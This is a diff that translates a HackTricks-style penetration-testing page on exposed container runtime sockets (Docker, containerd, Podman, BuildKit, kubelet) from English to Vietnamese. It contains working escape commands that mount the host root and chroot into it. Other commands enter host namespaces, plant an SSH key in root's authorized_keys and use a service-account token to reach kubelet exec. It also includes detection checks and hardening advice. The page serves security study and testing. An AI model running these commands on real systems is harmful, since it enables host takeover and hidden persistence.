@@ -1,22 +1,22 @@
-# Runtime API And Daemon Exposure
+# API Runtime Và Mức Độ Phơi Lộ Daemon
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Overview
+## Tổng quan
 
-Many real container compromises do not begin with a namespace escape at all. They begin with access to the runtime control plane. If a workload can talk to `dockerd`, `containerd`, CRI-O, Podman, or kubelet through a mounted Unix socket or an exposed TCP listener, the attacker may be able to request a new container with better privileges, mount the host filesystem, join host namespaces, or retrieve sensitive node information. In those cases, the runtime API is the real security boundary, and compromising it is functionally close to compromising the host.
+Nhiều vụ xâm nhập container thực tế không bắt đầu bằng việc thoát khỏi namespace. Chúng bắt đầu từ quyền truy cập vào control plane của runtime. Nếu một workload có thể giao tiếp với `dockerd`, `containerd`, CRI-O, Podman hoặc kubelet thông qua Unix socket được mount hoặc TCP listener bị lộ, kẻ tấn công có thể yêu cầu tạo container mới với đặc quyền cao hơn, mount filesystem của host, tham gia các namespace của host hoặc lấy thông tin nhạy cảm về node. Trong những trường hợp đó, API runtime chính là ranh giới bảo mật thực sự, và việc xâm phạm nó gần như tương đương với xâm phạm host.
 
-This is why runtime socket exposure should be documented separately from kernel protections. A container with ordinary seccomp, capabilities, and MAC confinement can still be one API call away from host compromise if `/var/run/docker.sock` or `/run/containerd/containerd.sock` is mounted inside it. The kernel isolation of the current container may be working exactly as designed while the runtime management plane remains fully exposed.
+Đây là lý do cần ghi nhận riêng việc để lộ socket runtime, thay vì gộp chung với các biện pháp bảo vệ kernel. Một container có seccomp, capabilities và MAC confinement thông thường vẫn có thể chỉ cách việc xâm phạm host một lệnh gọi API nếu `/var/run/docker.sock` hoặc `/run/containerd/containerd.sock` được mount bên trong nó. Kernel isolation của container hiện tại có thể vẫn hoạt động đúng như thiết kế, trong khi management plane của runtime hoàn toàn bị lộ.
 
-## Daemon Access Models
+## Các mô hình truy cập daemon
 
-Docker Engine traditionally exposes its privileged API through the local Unix socket at `unix:///var/run/docker.sock`. Historically it has also been exposed remotely through TCP listeners such as `tcp://0.0.0.0:2375` or a TLS-protected listener on `2376`. Exposing the daemon remotely without strong TLS and client authentication effectively turns the Docker API into a remote root interface.
+Docker Engine thường cung cấp API đặc quyền thông qua Unix socket cục bộ tại `unix:///var/run/docker.sock`. Trước đây, API này cũng được cung cấp từ xa qua TCP listener như `tcp://0.0.0.0:2375` hoặc listener được bảo vệ bằng TLS trên cổng `2376`. Việc để daemon truy cập từ xa mà không có TLS mạnh và xác thực client sẽ biến Docker API thành một giao diện root từ xa.
 
-containerd, CRI-O, Podman, and kubelet expose similar high-impact surfaces. The names and workflows differ, but the logic does not. If the interface lets the caller create workloads, mount host paths, retrieve credentials, or alter running containers, the interface is a privileged management channel and should be treated accordingly.
+containerd, CRI-O, Podman và kubelet cũng có các bề mặt tấn công tương tự, với mức độ ảnh hưởng cao. Tên gọi và quy trình khác nhau, nhưng nguyên tắc thì không. Nếu giao diện cho phép người gọi tạo workload, mount đường dẫn của host, lấy credentials hoặc thay đổi container đang chạy, thì đó là một kênh quản lý có đặc quyền và cần được xử lý tương ứng.
 
-A container-management web UI can expose the same boundary without giving the local account direct socket access. For example, [Portainer issue #493](https://github.com/portainer/portainer/issues/493) documented an unauthenticated administrator-password reset in a legacy 1.11.1 build. Treat a locally reachable UI as a review lead only: confirm the installed build and authentication behavior, actual administrator control, and whether its managed endpoint can create containers with a writable host bind mount. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket) that socket-backed management requires access to the Docker socket; a rootless or restricted endpoint changes the host impact. Do not infer the authentication flaw or host-root access from a process name, port, or version string alone.
+Một giao diện web quản lý container có thể làm lộ cùng ranh giới bảo mật này mà không cần cấp cho tài khoản cục bộ quyền truy cập trực tiếp vào socket. Ví dụ, [Portainer issue #493](https://github.com/portainer/portainer/issues/493) ghi nhận lỗi đặt lại mật khẩu quản trị viên không cần xác thực trong bản dựng cũ 1.11.1. Chỉ xem UI có thể truy cập cục bộ là manh mối cần kiểm tra: hãy xác nhận bản dựng đã cài đặt và cơ chế xác thực, quyền kiểm soát thực tế của quản trị viên, cũng như liệu endpoint được quản lý có thể tạo container với bind mount host có quyền ghi hay không. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket) rằng việc quản lý dựa trên socket cần quyền truy cập vào Docker socket; endpoint rootless hoặc bị giới hạn sẽ làm thay đổi mức độ ảnh hưởng đến host. Không suy luận rằng có lỗi xác thực hoặc quyền truy cập root trên host chỉ dựa vào tên tiến trình, cổng hoặc chuỗi phiên bản.
 
-Common local paths worth checking are:
+Các đường dẫn cục bộ thường cần kiểm tra là:
 
 ```text
 /var/run/docker.sock
@@ -29,24 +29,24 @@ Common local paths worth checking are:
 /run/firecracker-containerd.sock
 ```
 
-Older or more specialized stacks may also expose endpoints such as `dockershim.sock`, `frakti.sock`, or `rktlet.sock`. Those are less common in modern environments, but when encountered they should be treated with the same caution because they represent runtime-control surfaces rather than ordinary application sockets.
+Các stack cũ hơn hoặc chuyên biệt hơn cũng có thể để lộ các endpoint như `dockershim.sock`, `frakti.sock` hoặc `rktlet.sock`. Những endpoint này ít phổ biến hơn trong các môi trường hiện đại, nhưng khi gặp phải, cần thận trọng tương tự vì chúng là các bề mặt điều khiển runtime, chứ không phải socket ứng dụng thông thường.
 
-## Secure Remote Access
+## Truy cập từ xa an toàn
 
-If a daemon must be exposed beyond the local socket, the connection should be protected with TLS and preferably with mutual authentication so the daemon verifies the client and the client verifies the daemon. The old habit of opening the Docker daemon on plain HTTP for convenience is one of the most dangerous mistakes in container administration because the API surface is strong enough to create privileged containers directly.
+Nếu daemon phải được để lộ ngoài socket cục bộ, kết nối cần được bảo vệ bằng TLS và tốt nhất là dùng xác thực hai chiều để daemon xác minh client và client xác minh daemon. Thói quen cũ là mở Docker daemon qua HTTP thuần cho tiện lợi là một trong những sai lầm nguy hiểm nhất khi quản trị container, vì bề mặt API đủ mạnh để trực tiếp tạo container có đặc quyền.
 
-The historical Docker configuration pattern looked like:
+Mẫu cấu hình Docker trước đây trông như sau:
 
 ```bash
 DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
 sudo service docker restart
 ```
 
-On systemd-based hosts, daemon communication may also appear as `fd://`, meaning the process inherits a pre-opened socket from systemd rather than binding it directly itself. The important lesson is not the exact syntax but the security consequence. The moment the daemon listens beyond a tightly permissioned local socket, transport security and client authentication become mandatory rather than optional hardening.
+Trên các host dùng systemd, giao tiếp với daemon cũng có thể xuất hiện dưới dạng `fd://`, nghĩa là tiến trình kế thừa một socket đã được systemd mở sẵn, thay vì tự bind trực tiếp. Điều quan trọng cần nhớ không phải là cú pháp cụ thể, mà là hệ quả về bảo mật. Ngay khi daemon lắng nghe trên phạm vi rộng hơn một socket cục bộ được phân quyền chặt chẽ, bảo mật truyền tải và xác thực client trở thành yêu cầu bắt buộc, không còn là biện pháp hardening tùy chọn.
 
-## Abuse
+## Khai thác
 
-If a runtime socket is present, confirm which one it is, whether a compatible client exists, and whether raw HTTP or gRPC access is possible:
+Nếu có runtime socket, hãy xác định đó là socket nào, có client tương thích hay không và có thể truy cập trực tiếp qua HTTP hoặc gRPC hay không:
 
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
@@ -60,11 +60,11 @@ crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
 buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
 ```
 
-These commands are useful because they distinguish between a dead path, a mounted but inaccessible socket, and a live privileged API. If the client succeeds, the next question is whether the API can launch a new container with a host bind mount or host namespace sharing.
+Các lệnh này hữu ích vì chúng phân biệt được đường dẫn không còn tồn tại, socket đã mount nhưng không thể truy cập và API đặc quyền đang hoạt động. Nếu client kết nối thành công, câu hỏi tiếp theo là liệu API có thể khởi chạy container mới với bind mount của host hoặc dùng chung namespace của host hay không.
 
-### When No Client Is Installed
+### Khi Không Cài Đặt Client
 
-The absence of `docker`, `podman`, or another friendly CLI does not mean the socket is safe. Docker Engine speaks HTTP over its Unix socket, and Podman exposes both a Docker-compatible API and a Libpod-native API through `podman system service`. That means a minimal environment with only `curl` may still be enough to drive the daemon:
+Không có `docker`, `podman` hoặc CLI thân thiện nào khác không có nghĩa là socket an toàn. Docker Engine giao tiếp qua HTTP trên Unix socket, còn Podman cung cấp cả API tương thích với Docker lẫn API Libpod gốc thông qua `podman system service`. Điều đó có nghĩa là một môi trường tối giản chỉ có `curl` vẫn có thể đủ để điều khiển daemon:
 
 ```bash
 curl --unix-socket /var/run/docker.sock http://localhost/_ping
@@ -78,35 +78,35 @@ curl --unix-socket /run/podman/podman.sock http://d/_ping
 curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
 ```
 
-This matters during post-exploitation because defenders sometimes remove the usual client binaries but leave the management socket mounted. On Podman hosts, remember that the high-value path differs between rootful and rootless deployments: `unix:///run/podman/podman.sock` for rootful service instances and `unix://$XDG_RUNTIME_DIR/podman/podman.sock` for rootless ones.
+Điều này quan trọng trong giai đoạn post-exploitation vì đôi khi bên phòng thủ xóa các binary client thường dùng nhưng vẫn để socket quản lý được mount. Trên máy chủ Podman, hãy nhớ rằng đường dẫn có giá trị cao khác nhau giữa các triển khai rootful và rootless: `unix:///run/podman/podman.sock` cho các phiên bản dịch vụ rootful và `unix://$XDG_RUNTIME_DIR/podman/podman.sock` cho các phiên bản rootless.
 
-### Full Example: Docker Socket To Host Root
+### Ví dụ đầy đủ: Từ Docker Socket đến quyền root trên host
 
-If `docker.sock` is reachable, the classical escape is to start a new container that mounts the host root filesystem and then `chroot` into it:
+Nếu có thể truy cập `docker.sock`, cách thoát khỏi container kinh điển là khởi chạy một container mới, mount filesystem gốc của host, rồi `chroot` vào đó:
 
 ```bash
 docker -H unix:///var/run/docker.sock images
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
 ```
 
-This provides direct host-root execution through the Docker daemon. The impact is not limited to file reads. Once inside the new container, the attacker can alter host files, harvest credentials, implant persistence, or start additional privileged workloads.
+Điều này cho phép thực thi trực tiếp với quyền root trên host thông qua Docker daemon. Tác động không chỉ giới hạn ở việc đọc file. Khi đã vào container mới, kẻ tấn công có thể sửa đổi file trên host, thu thập thông tin xác thực, cài cắm cơ chế duy trì truy cập hoặc khởi chạy thêm các workload có đặc quyền.
 
-### Full Example: Docker Socket To Host Namespaces
+### Ví dụ đầy đủ: Docker Socket đến namespace của host
 
-If the attacker prefers namespace entry instead of filesystem-only access:
+Nếu kẻ tấn công muốn vào namespace thay vì chỉ truy cập filesystem:
 
 ```bash
 docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 ```
 
-This path reaches the host by asking the runtime to create a new container with explicit host-namespace exposure rather than by exploiting the current one.
+Đường đi này tiếp cận host bằng cách yêu cầu runtime tạo một container mới với quyền truy cập rõ ràng vào các namespace của host, thay vì khai thác container hiện tại.
 
 ### Docker Socket Persistence Pattern
 
-Runtime control can also be used for persistence instead of a one-shot shell. The generic pattern is to create a helper container with a host mount, write authorized access material or a startup hook into the mounted host filesystem, and then validate that the host consumes it.
+Có thể dùng quyền kiểm soát runtime để duy trì quyền truy cập, thay vì chỉ mở một shell dùng một lần. Mẫu tổng quát là tạo một helper container có host mount, ghi thông tin truy cập được cấp quyền hoặc startup hook vào filesystem được mount của host, rồi xác minh rằng host sử dụng chúng.
 
-Example shape:
+Dạng ví dụ:
 
 ```bash
 docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
@@ -115,11 +115,11 @@ docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
 docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
 ```
 
-The same idea can target systemd units, cron fragments, application startup files, or SSH keys depending on what the operator wants to prove. The important point is that the persistent change is made through the runtime daemon's host-level filesystem authority, not through extra privilege in the original container.
+Ý tưởng tương tự có thể nhắm đến các systemd unit, cron fragment, file khởi động ứng dụng hoặc SSH key, tùy vào điều operator muốn chứng minh. Điểm quan trọng là thay đổi bền vững được thực hiện thông qua quyền truy cập filesystem cấp host của runtime daemon, chứ không phải thông qua việc cấp thêm quyền cho container ban đầu.
 
 ### Raw Docker API Helper Pivot
 
-When the Docker CLI is missing, the same host-mount helper flow can be driven through HTTP over the Unix socket. The generic flow is: confirm the API, create a helper container with a host bind mount, start it, create an exec instance, and start that exec.
+Khi thiếu Docker CLI, có thể thực hiện cùng quy trình dùng host-mount helper thông qua HTTP trên Unix socket. Quy trình chung là: xác nhận API, tạo helper container với host bind mount, khởi chạy container, tạo exec instance rồi khởi chạy exec đó.
 
 ```bash
 curl --unix-socket /var/run/docker.sock http://localhost/_ping
@@ -134,11 +134,11 @@ curl --unix-socket /var/run/docker.sock \
   -X POST http://localhost/v1.54/containers/helper/exec
 ```
 
-The final `/exec/<id>/start` request depends on the returned exec ID, but the security point is independent of the exact JSON plumbing: raw API access to a rootful Docker daemon is enough to request a stronger helper workload.
+Yêu cầu `/exec/<id>/start` cuối cùng phụ thuộc vào exec ID được trả về, nhưng điểm bảo mật không phụ thuộc vào cách xử lý JSON cụ thể: chỉ cần truy cập API thô vào Docker daemon chạy bằng root là đủ để yêu cầu một workload hỗ trợ có quyền cao hơn.
 
-### Full Example: containerd Socket
+### Ví dụ đầy đủ: Socket containerd
 
-A mounted `containerd` socket is usually just as dangerous:<sup>[[1]](#references)</sup>
+Socket `containerd` được mount thường cũng nguy hiểm tương tự:<sup>[[1]](#references)</sup>
 
 ```bash
 ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
@@ -146,7 +146,7 @@ ctr --address /run/containerd/containerd.sock run --tty --privileged --mount typ
 chroot /host /bin/sh
 ```
 
-If a more Docker-like client is present, `nerdctl` can be more convenient than `ctr` because it exposes familiar flags such as `--privileged`, `--pid=host`, and `-v`:
+Nếu có sẵn một client giống Docker hơn, `nerdctl` có thể tiện lợi hơn `ctr` vì nó cung cấp các cờ quen thuộc như `--privileged`, `--pid=host` và `-v`:
 
 ```bash
 nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
@@ -154,20 +154,20 @@ nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -i
 chroot /host /bin/sh
 ```
 
-The impact is again host compromise. Even if Docker-specific tooling is absent, another runtime API may still offer the same administrative power. On Kubernetes nodes, `crictl` may also be enough for reconnaissance and container interaction because it speaks the CRI endpoint directly.
+Tác động vẫn là chiếm quyền host. Ngay cả khi không có công cụ riêng của Docker, một runtime API khác vẫn có thể cung cấp quyền quản trị tương tự. Trên các node Kubernetes, `crictl` cũng có thể đủ để reconnaissance và tương tác với container vì nó giao tiếp trực tiếp với CRI endpoint.
 
 ### BuildKit Socket
 
-`buildkitd` is easy to miss because people often think of it as "just the build backend", but the daemon is still a privileged control plane. A reachable `buildkitd.sock` can allow an attacker to run arbitrary build steps, inspect worker capabilities, use local contexts from the compromised environment, and request dangerous entitlements such as `network.host` or `security.insecure` when the daemon was configured to allow them.
+Dễ bỏ sót `buildkitd` vì mọi người thường nghĩ đây “chỉ là backend để build”, nhưng daemon này vẫn là một control plane có đặc quyền. `buildkitd.sock` có thể truy cập được sẽ cho phép attacker chạy các build step tùy ý, kiểm tra các khả năng của worker, sử dụng local context từ môi trường đã bị compromise và yêu cầu các entitlement nguy hiểm như `network.host` hoặc `security.insecure` nếu daemon được cấu hình cho phép.
 
-Useful first interactions are:
+Các tương tác ban đầu hữu ích gồm:
 
 ```bash
 buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
 buildctl --addr unix:///run/buildkit/buildkitd.sock du
 ```
 
-If the daemon accepts build requests, test whether insecure entitlements are available:
+Nếu daemon chấp nhận các yêu cầu build, hãy kiểm tra xem có các entitlement không an toàn hay không:
 
 ```bash
 buildctl --addr unix:///run/buildkit/buildkitd.sock build \
@@ -179,13 +179,13 @@ buildctl --addr unix:///run/buildkit/buildkitd.sock build \
   --output type=local,dest=/tmp/buildkit-out
 ```
 
-The exact impact depends on daemon configuration, but a rootful BuildKit service with permissive entitlements is not a harmless developer convenience. Treat it as another high-value administrative surface, especially on CI runners and shared build nodes.
+Tác động chính xác phụ thuộc vào cấu hình daemon, nhưng dịch vụ BuildKit chạy với quyền root và entitlements rộng không phải là tiện ích vô hại dành cho developer. Hãy xem đây là một bề mặt quản trị có giá trị cao khác, đặc biệt trên CI runner và các node build dùng chung.
 
-### Kubelet API Over TCP
+### Kubelet API qua TCP
 
-The kubelet is not a container runtime, but it is still part of the node management plane and often sits in the same trust boundary discussion. If the kubelet secure port `10250` is reachable from the workload, or if node credentials, kubeconfigs, or proxy rights are exposed, the attacker may be able to enumerate Pods, retrieve logs, or execute commands in node-local containers without ever touching the Kubernetes API server admission path.
+Kubelet không phải là container runtime, nhưng vẫn thuộc mặt phẳng quản lý node và thường nằm trong cùng phạm vi ranh giới tin cậy. Nếu workload có thể truy cập cổng bảo mật của kubelet `10250`, hoặc thông tin xác thực của node, kubeconfig hay quyền proxy bị lộ, kẻ tấn công có thể liệt kê Pod, lấy log hoặc thực thi lệnh trong các container cục bộ trên node mà không cần đi qua đường dẫn admission của Kubernetes API server.
 
-Start with cheap discovery:
+Bắt đầu bằng các bước dò tìm đơn giản:
 
 ```bash
 curl -sk https://127.0.0.1:10250/pods
@@ -194,11 +194,11 @@ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
 curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
 ```
 
-If the kubelet or API-server proxy path authorizes `exec`, a WebSocket-capable client can turn that into code execution in other containers on the node. This is also why `nodes/proxy` with only `get` permission is more dangerous than it sounds: the request can still reach kubelet endpoints that execute commands, and those direct kubelet interactions do not show up in normal Kubernetes audit logs.<sup>[[2]](#references)</sup>
+Nếu kubelet hoặc API-server proxy path cấp quyền `exec`, một client hỗ trợ WebSocket có thể biến việc đó thành code execution trong các container khác trên node. Đây cũng là lý do `nodes/proxy` chỉ có quyền `get` vẫn nguy hiểm hơn vẻ ngoài: request vẫn có thể đến các kubelet endpoint thực thi lệnh, và những tương tác trực tiếp đó với kubelet không xuất hiện trong Kubernetes audit logs thông thường.<sup>[[2]](#references)</sup>
 
 ## Checks
 
-The goal of these checks is to answer whether the container can reach any management plane that should have remained outside the trust boundary.
+Mục tiêu của các kiểm tra này là xác định liệu container có thể truy cập bất kỳ management plane nào vốn phải nằm ngoài ranh giới tin cậy hay không.
 
 ```bash
 mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
@@ -207,25 +207,24 @@ env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_
 find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
 ```
 
-What is interesting here:
+Điều đáng chú ý ở đây:
 
-- A mounted runtime socket is usually a direct administrative primitive rather than mere information disclosure.
-- A TCP listener on `2375` without TLS should be treated as a remote-compromise condition.
-- Environment variables such as `DOCKER_HOST` often reveal that the workload was intentionally designed to talk to the host runtime.
+- Socket runtime được mount thường là một primitive quản trị trực tiếp, chứ không chỉ đơn thuần làm lộ thông tin.
+- Listener TCP trên `2375` không có TLS cần được xem là tình trạng có thể dẫn đến xâm nhập từ xa.
+- Các biến môi trường như `DOCKER_HOST` thường cho thấy workload được thiết kế có chủ đích để giao tiếp với runtime trên host.
 
-## Runtime Defaults
+## Mặc định của runtime
 
-| Runtime / platform | Default state | Default behavior | Common manual weakening |
+| Runtime / nền tảng | Trạng thái mặc định | Hành vi mặc định | Cách cấu hình yếu đi thường gặp |
 | --- | --- | --- | --- |
-| Docker Engine | Local Unix socket by default | `dockerd` listens on the local socket and the daemon is usually rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
-| Podman | Daemonless CLI by default | No long-lived privileged daemon is required for ordinary local use; API sockets may still be exposed when `podman system service` is enabled | exposing `podman.sock`, running the service broadly, rootful API use |
-| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
-| CRI-O | Local privileged socket | CRI endpoint is intended for node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
-| Kubernetes kubelet | Node-local management API | Kubelet should not be broadly reachable from Pods; access may expose pod state, credentials, and execution features depending on authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
+| Docker Engine | Mặc định dùng Unix socket cục bộ | `dockerd` lắng nghe trên socket cục bộ và daemon thường chạy với quyền root | mount `/var/run/docker.sock`, expose `tcp://...:2375`, TLS yếu hoặc không có trên `2376` |
+| Podman | Mặc định dùng CLI không cần daemon | Không cần daemon đặc quyền chạy lâu dài cho các tác vụ cục bộ thông thường; socket API vẫn có thể được expose khi bật `podman system service` | expose `podman.sock`, chạy service trên phạm vi rộng, sử dụng API với quyền root |
+| containerd | Socket đặc quyền cục bộ | API quản trị được expose qua socket cục bộ và thường được các công cụ cấp cao hơn sử dụng | mount `containerd.sock`, cấp quyền truy cập `ctr` hoặc `nerdctl` quá rộng, expose các namespace đặc quyền |
+| CRI-O | Socket đặc quyền cục bộ | Endpoint CRI dành cho các thành phần đáng tin cậy chạy trên node | mount `crio.sock`, expose endpoint CRI cho workload không đáng tin cậy |
+| Kubernetes kubelet | API quản lý cục bộ trên node | Kubelet không nên truy cập được rộng rãi từ các Pod; tùy thuộc vào authn/authz, quyền truy cập có thể làm lộ trạng thái Pod, thông tin xác thực và các tính năng thực thi | mount socket hoặc cert của kubelet, xác thực kubelet yếu, dùng host networking kết hợp với endpoint kubelet có thể truy cập được |
 
 ## References
 
-- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
-- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
-
+- [1] [khai thác socket containerd phần 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
+- [2] [Rủi ro vượt qua Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
 {{#include ../../../banners/hacktricks-training.md}}
